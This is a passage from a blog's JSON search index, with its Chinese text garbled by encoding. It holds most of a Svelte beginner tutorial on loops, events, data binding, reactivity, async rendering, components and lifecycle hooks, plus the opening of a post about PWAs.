\u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item} \u0026lt;li\u0026gt;{item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; è¦æ³¨æ„ï¼ŒSvelte å’Œ Vue çš„éæ­·åœ¨å¯«æ³•ä¸Šæœ‰é»ä¸åŒã€‚\nVue çš„æ–¹å¼æ˜¯ï¼š\n1 2 3 \u0026lt;div v-for=\u0026#34;å…ƒç´  in æºæ•¸æ“š\u0026#34;\u0026gt; \u0026lt;span\u0026gt;{{å…ƒç´ }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; Svelte çš„æ–¹å¼æ˜¯ï¼š\n1 2 3 4 5 \u0026lt;div\u0026gt; {#each æºæ•¸æ“š as å…ƒç´ } \u0026lt;span\u0026gt;{å…ƒç´ }\u0026lt;/span\u0026gt; {/each} \u0026lt;/div\u0026gt; éæ­·æ•¸çµ„(å¸¶ index) 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item, index} \u0026lt;li\u0026gt;{index} -- {item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; æ³¨æ„ï¼šas å¾Œé¢é¦–å…ˆè·Ÿè‘—å…ƒç´ ï¼Œç„¶å¾Œæ‰æ˜¯ä¸‹æ¨™ã€‚è€Œä¸”å…ƒç´ å’Œä¸‹æ¨™ä¸éœ€è¦ç”¨æ‹¬è™Ÿæ‹¬èµ·ä¾†ã€‚\nå¦‚æœå…ƒç´ æ˜¯å°è±¡ï¼Œå¯ä»¥è§£æ§‹ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let list = [ {name: \u0026#39;é›·çŒ´\u0026#39;}, {name: \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39;} ] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as {name}} \u0026lt;li\u0026gt;{name}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; é»˜èªå…§å®¹ å¦‚æœæºæ•¸æ“šæ²’æœ‰å…§å®¹ï¼Œæ˜¯ç©ºæ•¸çµ„çš„æƒ…æ³ä¸‹ï¼Œé‚„å¯ä»¥çµ„åˆ {:else} ä¸€èµ·ä½¿ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let list = [] \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; {#each list as {name}} \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;æš«ç„¡æ•¸æ“š\u0026lt;/div\u0026gt; {/each} \u0026lt;/div\u0026gt; äº‹ä»¶ç¶å®š on:event ä½¿ç”¨ on: æŒ‡ä»¤ç›£è½ DOM äº‹ä»¶ï¼Œon: å¾Œé¢è·Ÿéš¨äº‹ä»¶é¡å‹\nèªæ³•ï¼š\n1 on:äº‹ä»¶é¡å‹={äº‹ä»¶å} èˆ‰å€‹ä¾‹å­ï¼Œé»æ“ŠæŒ‰éˆ•æ™‚åœ¨æ§åˆ¶å°è¼¸å‡º\u0026quot;é›·çŒ´\u0026quot;ã€‚\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;é›·çŒ´\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={sayHi}\u0026gt;æ‰“æ‹›å‘¼\u0026lt;/button\u0026gt; ç¶å®šå…¶ä»–äº‹ä»¶ï¼ˆæ¯”å¦‚changeç­‰ï¼‰ä¹Ÿæ˜¯åŒæ¨£çš„é“ç†ã€‚\näº‹ä»¶ä¿®é£¾ç¬¦ å¦‚æœä½ åªå¸Œæœ›æŸäº›äº‹ä»¶åªåŸ·è¡Œä¸€æ¬¡ï¼Œæˆ–è€…å–æ¶ˆé»˜èªè¡Œç‚ºï¼Œæˆ–è€…é˜»æ­¢å†’æ³¡ç­‰ï¼Œå¯ä»¥ä½¿ç”¨äº‹ä»¶ä¿®é£¾ç¬¦ã€‚\nèªæ³•ï¼š\n1 on:äº‹ä»¶é¡å‹|ä¿®é£¾ç¬¦={äº‹ä»¶å} èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å¸Œæœ›é»æ“Šäº‹ä»¶åªèƒ½åŸ·è¡Œä¸€æ¬¡ï¼Œä¹‹å¾Œå†é»æ“Šéƒ½ç„¡æ•ˆï¼Œå¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ once ä¿®é£¾ç¬¦ã€‚\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;é›·çŒ´\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click|once={sayHi}\u0026gt;æ‰“æ‹›å‘¼\u0026lt;/button\u0026gt; å¾ä¸Šåœ–å¯ä»¥çœ‹å‡ºï¼Œå¤šæ¬¡é»æ“Šéƒ½åªæ˜¯è¼¸å‡º1æ¬¡\u0026quot;é›·çŒ´\u0026quot;ã€‚\né™¤äº† once ä¹‹å¤–ï¼Œé‚„æœ‰ä»¥ä¸‹é€™äº›ä¿®é£¾ç¬¦å¯ä»¥ç”¨ï¼š\npreventDefaultï¼šç¦æ­¢é»˜èªäº‹ä»¶ã€‚åœ¨ç¨‹åºé‹è¡Œä¹‹å‰èª¿ç”¨event.preventDefault() stopPropagationï¼šèª¿ç”¨event.stopPropagation(), é˜²æ­¢äº‹ä»¶åˆ°é”ä¸‹ä¸€å€‹æ¨™ç±¤ passiveï¼šæ”¹å–„äº†touch/wheel äº‹ä»¶çš„æ»¾å‹•è¡¨ç¾ï¼ˆSvelteæœƒåœ¨åˆé©çš„åœ°æ–¹è‡ªå‹•åŠ ä¸Šå®ƒï¼‰ captureï¼šè¡¨ç¤ºåœ¨captureéšæ®µè€Œä¸æ˜¯bubblingè§¸ç™¼å…¶ç¨‹åº onceï¼šç¨‹åºé‹è¡Œä¸€æ¬¡å¾Œåˆªé™¤è‡ªèº« ä¸²è¯ä¿®é£¾ç¬¦ ä¿®é£¾ç¬¦é‚„å¯ä»¥ä¸²è¯èµ·ä¾†ä½¿ç”¨ï¼Œæ¯”å¦‚ on:click|once|capture={...}\nä½†éœ€è¦æ³¨æ„ï¼Œæœ‰äº›ç‰¹æ®Šçš„æ¨™ç±¤ä½¿ç”¨ä¿®é£¾ç¬¦æœƒå‡ºç¾\u0026quot;æ„æƒ³ä¸åˆ°\u0026ldquo;çš„çµæœï¼Œæ¯”å¦‚ \u0026lt;a\u0026gt; æ¨™ç±¤ã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function toLearn() { console.log(\u0026#39;é‚„åœ¨æ€è€ƒè¦ä¸è¦å­¸Canvas\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;a href=\u0026#34;https://juejin.cn/post/7116784455561248775\u0026#34; on:click|once|preventDefault={toLearn} \u0026gt;å»å­¸ç¿’Canvas ï¼Ÿ\u0026lt;/a\u0026gt; æœ¬ä¾†æ˜¯æƒ³çµ¦ \u0026lt;a\u0026gt; æ¨™ç±¤ç¶å®šä¸€å€‹é»æ“Šäº‹ä»¶ï¼Œç¬¬ä¸€æ¬¡é»æ“Šæ™‚åœ¨æ§åˆ¶å°è¼¸å‡ºä¸€å¥è©±ï¼Œä¸¦ä¸”ç¦æ­¢ \u0026lt;a\u0026gt; æ¨™ç±¤çš„é»˜èªäº‹ä»¶ã€‚\næ‰€ä»¥ä½¿ç”¨äº† once å’Œ preventDefault ä¿®é£¾ç¬¦ã€‚\nä½†å¯¦éš›ä¸Šä¸¦éå¦‚æ­¤ã€‚ä¸Šé¢çš„ä»£ç¢¼æ„æ€æ˜¯ once è¨­å®šäº†åªåŸ·è¡Œä¸€æ¬¡ toLearn äº‹ä»¶ï¼Œä¸¦ä¸”åªæœ‰ä¸€æ¬¡ preventDefault æ˜¯æœ‰æ•ˆçš„ã€‚\nåªæœ‰é»æ“Šæ™‚å°±ä¸è§¸ç™¼ toLearn äº†ï¼Œè€Œä¸” preventDefault ä¹Ÿæœƒå¤±æ•ˆã€‚æ‰€ä»¥å†æ¬¡é»æ“Šæ™‚ï¼Œ\u0026lt;a\u0026gt;å…ƒç´ å°±æœƒè§¸ç™¼è‡ªèº«çš„è·³è½‰åŠŸèƒ½ã€‚\næ•¸æ“šç¶å®š bind æ•¸æ“šç¶å®šé€šå¸¸æœƒå’Œè¡¨å–®å…ƒç´ çµåˆä½¿ç”¨ã€‚\nbind å¯ä»¥åšåˆ°é›™å‘æ•¸æ“šç¶å®šçš„æ•ˆæœã€‚æˆ‘è¦ºå¾— Svelte è£¡çš„ bind æœ‰é»åƒ Vue çš„ v-modelã€‚\nèªæ³•ï¼š\n1 bind:property={variable} input å–®è¡Œè¼¸å…¥æ¡† 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; function print() { console.log(msg) } \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value={msg} /\u0026gt; \u0026lt;button on:click={print}\u0026gt;æ‰“å°\u0026lt;/button\u0026gt; å¦‚æœåªæ˜¯ä½¿ç”¨ value={msg} çš„å¯«æ³•ï¼Œinput é»˜èªå€¼æ˜¯ helloï¼Œç•¶è¼¸å…¥æ¡†çš„å€¼ç™¼ç”Ÿæ”¹è®Šæ™‚ï¼Œä¸¦æ²’æœ‰æŠŠå…§å®¹åæ‡‰å› msg è®Šé‡è£¡ã€‚\næ­¤æ™‚å°±éœ€è¦ä½¿ç”¨ bind äº†ã€‚\n1 2 \u0026lt;!-- çœç•¥éƒ¨åˆ†ä»£ç¢¼ --\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; textarea å¤šè¡Œæ–‡æœ¬æ¡† å¤šè¡Œæ–‡æœ¬æ¡†åŒæ¨£ç¶å®šåœ¨ value å±¬æ€§ä¸Šã€‚\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;textarea type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; \u0026lt;p\u0026gt;{msg}\u0026lt;/p\u0026gt; input range ç¯„åœé¸æ“‡ å› ç‚ºéƒ½æ˜¯ input å…ƒç´ ï¼Œåªæ˜¯ type ä¸åŒè€Œå·²ã€‚æ‰€ä»¥ç¯„åœé¸æ“‡å…ƒç´ åŒæ¨£éœ€è¦ç¶å®švalueã€‚\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let val = 3 \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; bind:value={val} min=0 max=10 /\u0026gt; \u0026lt;p\u0026gt;{val}\u0026lt;/p\u0026gt; radio å–®é¸ å–®é¸æ¡†é€šå¸¸æ˜¯æˆçµ„å‡ºç¾çš„ï¼Œæ‰€ä»¥è¦ç¶å®šä¸€å€‹ç‰¹æ®Šçš„å€¼ bind:grout={variable}\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; let selected = \u0026#39;2\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;3\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{selected}\u0026lt;/p\u0026gt; checkbox è¤‡é¸æ¡† 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let roles = [] \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;é›·çŒ´\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;é²¨é±¼è¾£æ¤’\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;èŸ‘è‚æ¶éœ¸\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;èå­è±è±\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{roles}\u0026lt;/p\u0026gt; select é¸æ“‡å™¨ 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let selected = \u0026#39;a\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;select bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#39;a\u0026#39;\u0026gt;a\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;b\u0026#39;\u0026gt;b\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;c\u0026#39;\u0026gt;c\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; select multiple é¸æ“‡å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let selected = [] \u0026lt;/script\u0026gt; \u0026lt;select multiple bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#34;é›·çŒ´\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;é²¨é±¼è¾£æ¤’\u0026#34;\u0026gt;é²¨é±¼è¾£æ¤’\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;èŸ‘è‚æ¶éœ¸\u0026#34;\u0026gt;èŸ‘è‚æ¶éœ¸\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;èå­è±è±\u0026#34;\u0026gt;èå­è±è±\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; ç°¡å¯«å½¢å¼ å¦‚æœ bind ç¶å®šçš„å±¬æ€§å’Œåœ¨ JS è£¡è²æ˜çš„è®Šé‡åç›¸åŒï¼Œé‚£å¯ä»¥ç›´æ¥ç¶å®š\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; let value = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value /\u0026gt; \u0026lt;p\u0026gt;{value}\u0026lt;/p\u0026gt; é€™å€‹ä¾‹å­ä¸­ï¼Œ bind:value ç¶å®šçš„å±¬æ€§æ˜¯ valueï¼Œè€Œåœ¨ JS ä¸­è²æ˜çš„è®Šé‡åä¹Ÿå« valueï¼Œæ­¤æ™‚å°±å¯ä»¥ä½¿ç”¨ç°¡å¯«çš„æ–¹å¼ã€‚\n$: è²æ˜åæ‡‰æ€§ é€šéä½¿ç”¨ $: JS label èªæ³•ä½œç‚ºå‰ç¶´ã€‚å¯ä»¥è®“ä»»ä½•ä½æ–¼top-level çš„èªå¥ï¼ˆå³ä¸åœ¨å¡Šæˆ–å‡½æ•¸å…§éƒ¨ï¼‰å…·æœ‰åæ‡‰æ€§ã€‚æ¯ç•¶å®ƒå€‘ä¾è³´çš„å€¼ç™¼ç”Ÿæ›´æ”¹æ™‚ï¼Œå®ƒå€‘éƒ½æœƒåœ¨ component æ›´æ–°ä¹‹å‰ç«‹å³é‹è¡Œã€‚\nä¸Šé¢é€™æ®µè§£é‡‹æ˜¯å®˜æ–¹æ–‡æª”çš„è§£é‡‹ã€‚\n$:åœ¨æ–‡æª”ä¸­ç¨±ç‚ºReactivityï¼Œä¸­æ–‡æ–‡æª”æˆå®ƒç‚ºåæ‡‰æ€§èƒ½åŠ›ã€‚\nä½†æˆ‘ä½¿ç”¨ $: æ™‚ï¼Œè¦ºå¾—é€™å€‹åŠŸèƒ½æœ‰é»åƒ Vue çš„ computedã€‚\n$: å¯ä»¥ç›£è½è¡¨é”å¼å…§éƒ¨çš„è®ŠåŒ–å¾è€Œåšå‡ºéŸ¿æ‡‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; let count = 0; $: doubled = count * 2; function handleClick() { count += 1; } \u0026lt;/script\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt; é»æ“ŠåŠ 1 \u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;{count} ç¿»å€å¾Œ {doubled}\u0026lt;/p\u0026gt; ä½¿ç”¨ $: è²æ˜çš„ double æœƒè‡ªå‹•æ ¹æ“š count çš„å€¼æ”¹è®Šè€Œæ”¹è®Šã€‚\nå¦‚æœå°‡ä»¥ä¸Šä»£ç¢¼ä¸­ $: æ”¹æˆ let æˆ–è€… var è²æ˜ countï¼Œé‚£éº¼ count å°‡å¤±å»éŸ¿æ‡‰æ€§ã€‚\né€™æ¨£çœ‹ä¾†ï¼ŒçœŸçš„å’Œ Vue çš„ computed çš„ä½œç”¨æœ‰é‚£éº¼ä¸€é»åƒã€‚\nç•°æ­¥æ¸²æŸ“ #await Svelte æä¾›ç•°æ­¥æ¸²æŸ“æ¨™ç±¤ï¼Œå¯ä»¥æå‡ç”¨æˆ¶é«”é©—ã€‚\nèªæ³•ï¼š\n1 2 3 4 5 6 7 {#await expression} ... {:then name} ... {:catch name} ... {/await} ä»¥ #await é–‹å§‹ã€ä»¥ /await çµæŸã€‚\n:then ä»£è¡¨æˆåŠŸçµæœï¼Œ:catch ä»£è¡¨å¤±æ•—çµæœã€‚\nexpressionæ˜¯åˆ¤æ–·é«”ï¼Œè¦æ±‚è¿”å›ä¸€å€‹Promiseã€‚\nå…¶å¯¦ç”¨æ³•å’Œ #if ... :else if ... /if æœ‰é‚£éº¼ä¸€ä¸Ÿä¸Ÿåƒã€‚\nèˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; const api = new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(\u0026#39;è«‹æ±‚æˆåŠŸï¼Œæ•¸æ“šæ˜¯xxxxx\u0026#39;) }, 1000) }) \u0026lt;/script\u0026gt; {#await api} \u0026lt;span\u0026gt;Loading...\u0026lt;/span\u0026gt; {:then response} \u0026lt;span\u0026gt;{response}\u0026lt;/span\u0026gt; {:catch error} \u0026lt;span\u0026gt;{error}\u0026lt;/span\u0026gt; {/await} å¦‚æœå°‡ä¸Šé¢çš„ resolve æ”¹æˆ reject å°±æœƒèµ° :catch åˆ†æ”¯ã€‚\nåŸºç¤çµ„ä»¶ åœ¨ Svelte ä¸­ï¼Œå‰µå»ºçµ„ä»¶åªéœ€è¦å‰µå»ºä¸€å€‹ .svelte ç‚ºå¾Œç¶´çš„æ–‡ä»¶å³å¯ã€‚\né€šé import å¼•å…¥å­çµ„ä»¶ã€‚\næ¯”å¦‚ï¼Œåœ¨ src ç›®éŒ„ä¸‹æœ‰ App.svelte å’Œ Phone.svelte å…©å€‹çµ„ä»¶ã€‚\nApp.svelte æ˜¯çˆ¶ç´šï¼Œæƒ³è¦å¼•å…¥ Phone.svelte ä¸¦åœ¨ HTML ä¸­ä½¿ç”¨ã€‚\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone /\u0026gt; Phone.svelte 1 \u0026lt;div\u0026gt;é›»è©±ï¼š13266668888\u0026lt;/div\u0026gt; çµ„ä»¶é€šè¨Š çµ„ä»¶é€šè¨Šä¸»è¦æ˜¯ çˆ¶å­çµ„ä»¶ ä¹‹é–“çš„æ•¸æ“šä¾†å¾€ã€‚\nçˆ¶å‚³å­ æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œæ‰‹æ©Ÿè™Ÿå¸Œæœ›å¾ App.svelte çµ„ä»¶å¾€ Phone.svelte è£¡å‚³ã€‚\nå¯ä»¥åœ¨ Phone.svelte ä¸­è²æ˜ä¸€å€‹è®Šé‡ï¼Œä¸¦å…¬é–‹è©²è®Šé‡ã€‚\nApp.svelte å°±å¯ä»¥ä½¿ç”¨å°æ‡‰çš„å±¬æ€§æŠŠå€¼å‚³å…¥ã€‚\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone number=\u0026#34;88888888\u0026#34; /\u0026gt; Phone.svelte 1 2 3 4 5 \u0026lt;script\u0026gt; export let number = \u0026#39;13266668888\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;é›»è©±ï¼š{number}\u0026lt;/div\u0026gt; å¦‚æœæ­¤æ™‚ App.svelte çµ„ä»¶æ²’æœ‰å‚³å€¼é€²ä¾†ï¼ŒPhone.svelte å°±æœƒä½¿ç”¨é»˜èªå€¼ã€‚\nå­å‚³çˆ¶ å¦‚æœæƒ³åœ¨å­çµ„ä»¶ä¸­ä¿®æ”¹çˆ¶çµ„ä»¶çš„å…§å®¹ï¼Œéœ€è¦æŠŠä¿®æ”¹çš„æ–¹æ³•å®šç¾©åœ¨çˆ¶çµ„ä»¶ä¸­ï¼Œä¸¦æŠŠè©²æ–¹æ³•å‚³çµ¦å­çµ„ä»¶èª¿ç”¨ã€‚\nåŒæ™‚éœ€è¦åœ¨å­çµ„ä»¶ä¸­å¼•å…¥ createEventDispatcher æ–¹æ³•ã€‚\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; function print(data) { console.log(`æ‰‹æ©Ÿè™Ÿç¢¼ï¼š${data.detail}`) } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone on:printPhone={print} /\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; import { createEventDispatcher } from \u0026#39;svelte\u0026#39; const dispatch = createEventDispatcher() function printPhone() { dispatch(\u0026#39;printPhone\u0026#39;, \u0026#39;13288888888\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={printPhone}\u0026gt;è¼¸å‡ºæ‰‹æ©Ÿè™Ÿç¢¼\u0026lt;/button\u0026gt; çˆ¶çµ„ä»¶æ¥å—åƒæ•¸æ˜¯ä¸€å€‹å°è±¡ï¼Œå­çµ„ä»¶å‚³éä¾†çš„å€¼éƒ½æœƒæ”¾åœ¨ detail å±¬æ€§è£¡ã€‚\næ’æ§½ slot å’Œ Vue ä¸€æ¨£ï¼ŒSvelte ä¹Ÿæœ‰çµ„ä»¶æ’æ§½ã€‚\nåœ¨å­çµ„ä»¶ä¸­ä½¿ç”¨ \u0026lt;slot\u0026gt; æ¨™ç±¤ï¼Œå¯ä»¥æ¥æ”¶çˆ¶çµ„ä»¶å‚³é€²ä¾†çš„ HTML å…§å®¹ã€‚\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone\u0026gt; \u0026lt;div\u0026gt;é›»è©±ï¼š\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;13288889999\u0026lt;/div\u0026gt; \u0026lt;/Phone\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;style\u0026gt; .box { width: 100px; border: 1px solid #aaa; border-radius: 8px; box-shadow: 2px 2px 8px rgba(0,0,0,0.1); padding: 1em; margin: 1em 0; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;é»˜è®¤å€¼\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; ç”Ÿå‘½é€±æœŸ ç”Ÿå‘½é€±æœŸæ˜¯æŒ‡é …ç›®é‹è¡Œæ™‚ï¼ŒæŒ‡å®šæ™‚æœŸæœƒè‡ªå‹•åŸ·è¡Œçš„æ–¹æ³•ã€‚\nSvelte ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å¹¾å€‹ç”Ÿå‘½é€±æœŸï¼š\nonMountï¼š çµ„ä»¶æ›è¼‰æ™‚èª¿ç”¨ã€‚ onDestroyï¼š çµ„ä»¶éŠ·æ¯€æ™‚åŸ·è¡Œã€‚ beforeUpdateï¼š åœ¨æ•¸æ“šæ›´æ–°å‰åŸ·è¡Œã€‚ afterUpdateï¼š åœ¨æ•¸æ“šæ›´æ–°å®Œæˆå¾ŒåŸ·è¡Œã€‚ tickï¼š DOMå…ƒç´ æ›´æ–°å®Œæˆå¾ŒåŸ·è¡Œã€‚ ä»¥ä¸Šç”Ÿå‘½é€±æœŸéƒ½æ˜¯éœ€è¦å¾ svelte è£¡å¼•å…¥çš„ã€‚\nç”¨ onMount èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; import { onMount } from \u0026#39;svelte\u0026#39; let title = \u0026#39;Hello world\u0026#39; onMount(() =\u0026gt; { console.log(\u0026#39;onMount\u0026#39;) setTimeout(() =\u0026gt; title = \u0026#39;é›·çŒ´\u0026#39;, 1000) }) \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;{title}\u0026lt;/h1\u0026gt; åœ¨çµ„ä»¶åŠ è¼‰å®Œ1ç§’å¾Œï¼Œæ”¹è®Š title çš„å€¼ã€‚\nonDestroyã€beforeUpdate å’Œ afterUpdate éƒ½å’Œ onMount çš„ç”¨æ³•å·®ä¸å¤šï¼Œåªæ˜¯åŸ·è¡Œçš„æ™‚é–“æ¢ä»¶ä¸åŒã€‚\ntick æ˜¯æ¯”è¼ƒç‰¹æ®Šçš„ï¼Œtick å’Œ Vue çš„ nextTick å·®ä¸å¤šã€‚\nåœ¨ Svelte ä¸­ï¼Œtick çš„ä½¿ç”¨èªæ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;script\u0026gt; import { tick } from \u0026#39;svelte\u0026#39; await tick() // å…¶ä»–æ“ä½œ \u0026lt;/script\u0026gt; ç¸½çµ æœ¬æ–‡ä¸»è¦è¬›è§£äº† Svelte çš„åŸºç¤ç”¨æ³•ï¼Œä½† Svelte çš„å…§å®¹å’Œ API é ä¸æ­¢æ­¤ã€‚å®ƒé‚„æœ‰å¾ˆå¤šé«˜ç´šçš„ç”¨æ³•ä»¥åŠæä¾›äº†éæ¸¡å‹•ç•«åŠŸèƒ½ç­‰ã€‚\nSvelte æ˜¯ä¸€å€‹ Web æ‡‰ç”¨çš„æ§‹å»ºå·¥å…·ï¼Œå®ƒæ‰“åŒ…å‡ºä¾†çš„é …ç›®é«”ç©æ¯”è¼ƒå°ï¼Œæ€§èƒ½å¼·ï¼Œä¸ä½¿ç”¨è™›æ“¬DOMã€‚\nä½† Svelte çš„å…¼å®¹æ€§å’Œå‘¨é‚Šç”Ÿæ…‹ç›¸æ¯”èµ· Vue å’Œ React æœƒå·®ä¸€é»ã€‚\næ‰€ä»¥æ—¥å¸¸é …ç›®ä¸­éœ€è¦æ ¹æ“š Svelte çš„å„ªç¼ºé»é€²è¡Œå–æ¨ã€‚\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52441500615_771efe89dd_o.png","permalink":"https://wayneblog.ga/2022-10-21/svelte-quick-start/","title":"å‰ç«¯æ–°å¯µå…’ï¼Ÿ - Svelte ä»‹ç´¹"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰å¹¾å¤©èˆ‡å¤§å®¶åˆ†äº«ï¼Œç•¶é–‹å•ŸChromeå…§å»ºçš„PWAåŠŸèƒ½ï¼Œå°±å¯å°‡PWAçš„ç¶²é ï¼Œä¸€éµè®Šæˆä¸€å€‹æ‡‰ç”¨ç¨‹å¼ï¼Œé›–ç„¶èªªPWAåªæ˜¯åœ¨æ‡‰ç”¨ç¨‹å¼è£¡ï¼ŒåŒ…äº†Chromeçš„ç€è¦½å™¨ï¼Œä½†é–‹å•Ÿæ™‚å°±åƒæ‡‰ç”¨ç¨‹å¼ä¸€èˆ¬ï¼Œè®“ç¶²é å°±åƒæ‡‰ç”¨ç¨‹å¼ä¸€èˆ¬ï¼Œå…¶å¯¦ç°¡å–®çš„ä¾†èªªï¼Œé€™å°±æœ‰é»åƒPhoneGapçš„æ„Ÿè¦ºï¼Œä½†æ¯”PhoneGapè¦ä¾†çš„ç°¡å–®è¨±å¤šã€‚\nå› æ­¤åªè¦å°‡ç¶²é åŠ å…¥ä¸€äº›ç°¡å–®çš„å®£å‘Šèˆ‡è¨­å®šï¼Œç«‹å³å°±å¯å°‡ä¸€èˆ¬çš„ç¶²é è®ŠæˆPWAçš„ç¶²é æ‡‰ç”¨ç¨‹å¼ï¼ŒçœŸå¿ƒè¦ºå¾—PWAæ˜¯å€‹å¥½ç‰©ï¼Œå› æ­¤åªè¦ä½ æœƒå¯«ç¶²é ï¼Œå°±å¯å°‡ä½ æ‰€è¨­è¨ˆçš„ç¶²é 